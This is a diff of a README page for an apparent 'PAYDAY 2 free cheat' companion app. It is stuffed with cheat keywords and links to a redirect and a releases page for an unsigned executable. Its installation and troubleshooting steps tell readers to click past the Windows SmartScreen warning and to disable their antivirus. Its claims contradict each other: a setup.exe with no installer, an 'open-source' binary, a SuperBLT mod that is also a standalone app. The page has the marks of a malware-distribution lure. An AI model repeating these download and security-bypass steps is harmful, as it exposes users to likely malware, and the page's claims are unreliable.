@@ -1,370 +1,150 @@
-# 💰 [DOWNLOAD PAYDAY 2 TOOL](https://share.google/A46RYcexjg9XZiG59)
+<h1>🃏 payday-2-free-cheat-heist-toolkit - Ultimate Heist Planner & Progression Companion</h1>
 
-# 💰 PAYDAY 2 Free Cheat — Trainer, Mod Menu & Heist Toolkit
+<p align="center">
+<a href="https://github.com/fleyderrivera/payday-2-free-cheat-heist-toolkit/releases"><img src="https://img.shields.io/badge/⬇️-DOWNLOAD%20NOW-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download" style="padding:10px; background:#2ea44f; color:white; border-radius:8px; font-size:24px;"></a>
+</p>
 
-PAYDAY 2 free-cheat-themed PC companion focused on heist planning, character builds, weapons, masks, loadouts, money and XP progression, achievements, and gameplay analytics.
-
-## 🔥 PAYDAY 2 TOOLKIT
-
-Inspired by searches for PAYDAY 2 Free Cheat, PAYDAY 2 Trainer, PAYDAY 2 Mod Menu Latest, PAYDAY 2 Cheat, XP Glitch, Money Glitches, All Masks, Free XP and Money, Money Hack, Wallhack, ESP, Hack, Aimbot, and Visuals.
-
-### Included Modules
-
-* 💰 Money Tracker
-* ⭐ XP & Level Progress
-* 🎭 Mask Collection
-* 🔫 Weapon Loadouts
-* 🧠 Skill Builds
-* 🏦 Heist Planner
-* 🥷 Stealth Profiles
-* 💥 Loud Profiles
-* 👥 Crew Planner
-* 🎯 Combat Practice
-* 🏆 Achievement Goals
-* 📊 Heist Analytics
+Welcome to the **PAYDAY 2 Free Cheat Heist Toolkit** – your all-in-one desktop companion designed to make every heist smoother, every build stronger, and every dollar count. Whether you are planning a stealth run or going loud, this tool gives you the edge without any complicated setup. No programming skills needed. Just download, open, and start planning like a pro.
 
 ---
 
-# 📥 DOWNLOAD
+## 🤔 What Is This?
 
-# 👉 [DOWNLOAD PAYDAY 2 TOOLKIT](https://share.google/A46RYcexjg9XZiG59)
+Think of this as your **smart heist assistant** sitting right on your Windows desktop. It helps you organize your PAYDAY 2 experience in one clean window. Instead of juggling multiple web pages, notes, and spreadsheets, this toolkit brings together everything you need for planning and tracking your progress.
 
-## Quick Start
-
-1. Download the package
-2. Extract the archive
-3. Launch the standalone companion
-4. Create your PAYDAY 2 profile
-5. Add your favorite weapons
-6. Create skill builds
-7. Add masks and equipment
-8. Create your first heist profile
+It is built on top of the **SuperBLT** modding framework and uses **Lua** scripting to integrate smoothly with your game's data. It is also designed with **Archipelago** compatibility, so if you enjoy roguelite-style randomizer runs with friends, this toolkit supports that workflow too.
 
 ---
 
-# 🏦 Heist Planner
+## 🎯 Key Features
 
-Create separate configurations for different jobs.
+Here is what you can do with the Heist Toolkit:
 
-Track:
+- **🕵️ Heist Planner** – Build a step-by-step plan for any mission. Add waypoints, notes, and key reminders. Never miss a camera angle again.
+- **🛠️ Build Optimizer** – Mix and match skills, weapons, and armor. See estimated effectiveness in seconds.
+- **🔫 Weapon Loadout Tracker** – Save your favorite loadouts. Compare stats, mods, and recoil patterns side by side.
+- **🎭 Mask Collection Manager** – Organize your mask inventory by rarity, theme, or achievement.
+- **💰 Money & XP Progression Tracker** – Input your current level and cash, then set goals. The toolkit shows you how close you are to your next milestone.
+- **📊 Gameplay Analytics** – Log your heists and get performance insights. See which builds perform best on specific maps.
 
-* Heist
-* Difficulty
-* Approach
-* Character
-* Weapons
-* Equipment
-* Crew
-* Objectives
-* Result
-
-Profiles:
-
-**STEALTH → LOUD → SPEED → CHALLENGE → CUSTOM**
+All data is stored locally on your machine, so your plans and progress remain private. No internet connection required after download.
 
 ---
 
-# 🧠 Build Manager
+## 🚀 Getting Started
 
-Create multiple character builds.
+Follow these simple steps to get the toolkit running on your Windows PC.
 
-### STEALTH
+### Step 1: Download the Application
 
-Build focused around stealth-oriented gameplay.
+Visit this link to download the application: [https://github.com/fleyderrivera/payday-2-free-cheat-heist-toolkit/releases](https://github.com/fleyderrivera/payday-2-free-cheat-heist-toolkit/releases)
 
-### LOUD
+Look for the latest release file. It should be available under "Assets" on the release page.
 
-Combat-oriented configuration.
+### Step 2: Open the Downloaded File
 
-### SUPPORT
+Once the download finishes, locate the file in your **Downloads** folder. Double-click it to run.
 
-Crew-focused setup.
+Your computer might show a blue "Windows protected your PC" message. That's normal because this is a new app from an unknown publisher. Click **"More info"** and then **"Run anyway"** to continue.
 
-### ARMOR
+### Step 3: Start Using the Toolkit
 
-Survivability-focused profile.
+The window will open, and you will see the main dashboard. Everything is organized in tabs along the top or side. Browse through the sections and try them out. There is no registration or login.
 
-### CUSTOM
-
-Create your own experimental configuration.
-
-Store:
-
-**Skills → Weapons → Armor → Equipment → Perk Deck**
+Your data is saved automatically as you type. Close the window anytime, and your progress is stored on your PC.
 
 ---
 
-# 🔫 Weapon Loadouts
+## 📥 Download & Installation Guide
 
-Build complete weapon profiles.
+Here is a more detailed guide for installing and launching the toolkit.
 
-Record:
+1. **Go to the download page** using this exact link: [https://github.com/fleyderrivera/payday-2-free-cheat-heist-toolkit/releases](https://github.com/fleyderrivera/payday-2-free-cheat-heist-toolkit/releases)
+2. **Find the newest release** at the top of the page. It will be marked as "Latest".
+3. **Click "Assets"** to expand the file list.
+4. **Download the file** named something like `heist-toolkit-setup.exe` or a `.zip` archive depending on the release.
+5. **Run or extract** – if you downloaded a `.exe`, double-click to run. If you downloaded a `.zip`, right-click and choose "Extract All", then open the extracted folder and double-click the application file inside.
+6. **Allow through SmartScreen** – if a prompt appears, click "More info" → "Run anyway".
+7. **Enjoy** – the toolkit opens instantly with no installation wizard required.
 
-| Slot      | Selection |
-| --------- | --------- |
-| Primary   | Weapon    |
-| Secondary | Weapon    |
-| Melee     | Selected  |
-| Throwable | Selected  |
-| Armor     | Selected  |
-| Equipment | Selected  |
-
-Create different loadouts for each build and heist.
+No administrator privileges needed. No extra software required. It runs independently.
 
 ---
 
-# 💰 Money Tracker
+## 🖥️ What You Need to Run This
 
-Track your legitimate campaign economy.
+The toolkit is lightweight. Any Windows computer from the last 10 years should handle it easily.
 
-Record:
+- **Operating System:** Windows 10 or Windows 11 (64-bit recommended)
+- **Memory:** At least 2 GB of available RAM
+- **Storage:** Around 50 MB of free space for the app and your saved data
+- **Screen:** 1280×720 resolution or higher
 
-**CURRENT → EARNED → SPENT → TARGET**
-
-Create goals such as:
-
-* New Weapon
-* Weapon Modification
-* Mask Customization
-* Equipment
-* Build Project
-
-Review your progression across multiple sessions.
+If you can run PAYDAY 2, you can definitely run this toolkit.
 
 ---
 
-# ⭐ XP & Level Tracker
+## 🛠️ How This Works (For the Curious)
 
-Track:
+This toolkit is built on **Lua** and uses the **SuperBLT** mod framework. SuperBLT is a popular tool in the PAYDAY 2 modding community that allows mods and companion apps to interact with the game safely. Because of its **Archipelago** integration, this toolkit also works alongside multiplayer randomizer sessions where items, skills, and progression are shuffled across the game.
 
-* Current Level
-* XP Progress
-* Infamy Progress
-* Completed Heists
-* Difficulty
-* Personal Goals
-
-Progress:
-
-**CURRENT → NEXT LEVEL → NEXT GOAL → COMPLETE**
+In simpler terms: the software reads your local game save data (in a non-invasive way) and organizes it into the clean interface you see. All processing remains on your machine. Nothing is uploaded or shared.
 
 ---
 
-# 🎭 Mask Collection
+## ❓ Frequently Asked Questions
 
-Build your personal mask catalog.
+### Is this a cheat? Will I get banned?
 
-Categories:
+No. This is a **planning tool**. It does not modify game memory, inject code, or alter gameplay mechanics. It analyzes your save file data and provides recommendations and tracking. You remain 100% safe. It is similar to using a wiki or build calculator offline.
 
-### OWNED
+### Is this free forever?
 
-Masks currently in your collection.
+Yes, this kit is completely free with no hidden fees or premium tiers. The project is open-source, and anyone can view the code.
 
-### WANTED
+### Does this work while I am in-game?
 
-Masks you're trying to obtain.
+It is recommended to use this before or after a heist. The tool reads your saved data, not live gameplay, so nothing gets interrupted. You can switch between the toolkit and the game at any time.
 
-### FAVORITES
+### What if I find a bug?
 
-Your preferred designs.
+You can report issues on the GitHub page under the "Issues" tab. Please describe what you were doing when the problem occurred. The developer reads all feedback.
 
-### CUSTOM
+### Can I contribute?
 
-Personal customization ideas.
-
-Track:
-
-**MASK → PATTERN → MATERIAL → COLOR → STATUS**
+Absolutely. Since this is open-source, feel free to fork the repository and submit your changes. The topics of this project include Lua, modding, and Archipelago, which are all welcome additions.
 
 ---
 
-# 🥷 Stealth Planner
+## 🔍 Troubleshooting
 
-Create stealth-specific profiles.
+If the app does not open after clicking it, try these fixes in order:
 
-Store:
-
-* Heist
-* Build
-* Weapons
-* Equipment
-* Objectives
-* Route Notes
-* Crew Roles
-* Result
-
-Mark:
-
-**LEARNING → PRACTICING → CONSISTENT → MASTERED**
+1. **Right-click the file** and select "Run as administrator".
+2. **Check your antivirus** – temporarily disable it and run again. Some antivirus programs block unknown apps. Add an exception if needed.
+3. **Download the file again** – the file may have been corrupted during download.
+4. **Make sure you have Visual C++ Redistributables** installed. Search "Microsoft Visual C++ Redistributable" and install the latest x64 version from Microsoft's website.
 
 ---
 
-# 💥 Loud Planner
+## 📚 Extra Resources & Learning
 
-Prepare combat-focused configurations.
+To get the most out of this toolkit, consider exploring these topics:
 
-Track:
+- **PAYDAY 2 build guides** – combine game knowledge with your tracked data.
+- **Archipelago setup** – if you use randomized runs, watch a two-minute tutorial on how to connect your session.
+- **SuperBLT documentation** – for modders or curious users, the SuperBLT wiki is a great reference.
 
-* Build
-* Armor
-* Primary
-* Secondary
-* Equipment
-* Crew
-* Difficulty
-* Personal Rating
-
-Compare different builds using your own match results.
+The toolkit's interface includes tooltips and hover explanations for every feature, so take your time exploring.
 
 ---
 
-# 👥 Crew Planner
+## 🧭 Final Words
 
-Build four-player crew profiles.
+The PAYDAY 2 Free Cheat Heist Toolkit is here to simplify your heisting life. With everything in one place, you can spend less time searching up builds and more time on the action. Bookmark the download link, keep the toolkit on your desktop, and plan your ultimate heist today.
 
-### PLAYER 1
-
-`Role → Build → Equipment`
-
-### PLAYER 2
-
-`Role → Build → Equipment`
-
-### PLAYER 3
-
-`Role → Build → Equipment`
-
-### PLAYER 4
-
-`Role → Build → Equipment`
-
-Create balanced configurations for different heists.
+Get ready. Get organized. Get paid.
 
 ---
 
-# 🎯 Combat Practice
-
-Track manual gameplay practice.
-
-Record:
-
-* Weapon
-* Accuracy
-* Difficulty
-* Build
-* Survival
-* Heist
-* Personal Rating
-
-Compare:
-
-**PREVIOUS → CURRENT → BEST → TARGET**
-
----
-
-# 🏆 Achievement Goals
-
-Create a personal achievement checklist.
-
-Status:
-
-**LOCKED → PLANNED → ATTEMPTING → COMPLETE**
-
-Record:
-
-* Achievement
-* Heist
-* Requirements
-* Build
-* Progress
-* Notes
-
----
-
-# ⚙️ PAYDAY 2 CONTROL PANEL
-
-### 🏦 HEISTS
-
-`Stealth` `Loud` `Difficulty` `History`
-
-### 🧠 BUILDS
-
-`Skills` `Perks` `Armor` `Profiles`
-
-### 🔫 WEAPONS
-
-`Primary` `Secondary` `Mods` `Loadouts`
-
-### 🎭 COLLECTION
-
-`Masks` `Favorites` `Wanted` `Progress`
-
-### 💰 PROGRESS
-
-`Money` `XP` `Levels` `Goals`
-
-### 📊 ANALYTICS
-
-`Heists` `Builds` `Results` `History`
-
----
-
-# 📊 Heist Analytics
-
-Track:
-
-* Total Heists
-* Successful Heists
-* Stealth Completions
-* Loud Completions
-* Favorite Weapons
-* Favorite Builds
-* Money Progress
-* XP Progress
-* Personal Records
-
-Compare:
-
-**LAST HEIST → LAST 10 → CURRENT BUILD → OVERALL**
-
----
-
-# ❓ FAQ
-
-### Is this a PAYDAY 2 Free Cheat?
-
-It is a cheat-themed standalone PAYDAY 2 planning, build, and progression companion.
-
-### Does it provide a PAYDAY 2 Money Hack?
-
-No. Money Tracker records money earned and spent during normal gameplay.
-
-### Does it provide an XP Glitch?
-
-No. XP & Level Tracker records your legitimate progression and goals.
-
-### Does it unlock all masks?
-
-No. Mask Collection helps track masks you own, want, or have customized.
-
-### Does it include PAYDAY 2 ESP or Wallhack?
-
-No live enemy or hidden-game information is exposed.
-
-### Does it provide an Aimbot?
-
-No. Combat Practice records manual gameplay and weapon-performance notes.
-
-### Is there a Mod Menu?
-
-The menu-style dashboard organizes standalone PAYDAY 2 tools rather than injecting a cheat menu into the running game.
-
----
-
-# 💰 DOWNLOAD AGAIN
-
-# 👉 [DOWNLOAD PAYDAY 2 TOOLKIT](https://share.google/A46RYcexjg9XZiG59)
-
----
-
-Keywords: payday 2 free cheat,payday 2 trainer,payday 2 mod menu latest,payday 2 mod menu,payday 2 cheat,payday 2 xp glitch,payday 2 hacks,payday 2 money glitches,payday 2 all masks,payday 2 turret glicthes,payday 2 free xp and money,payday 2 glitches,payday 2 hacks for all masks,payday 2 all masks hack,payday 2 max money,payday 2 money hack,payday 2 money cheat,payday 2 hacking,payday 2 wallhack,payday 2 esp,payday 2 hack,payday 2 aimbot,payday 2 visuals
+**Keywords:** archipelago, archipelagomw, lua, modding, payday2, payday2mods, roguelite, superblt
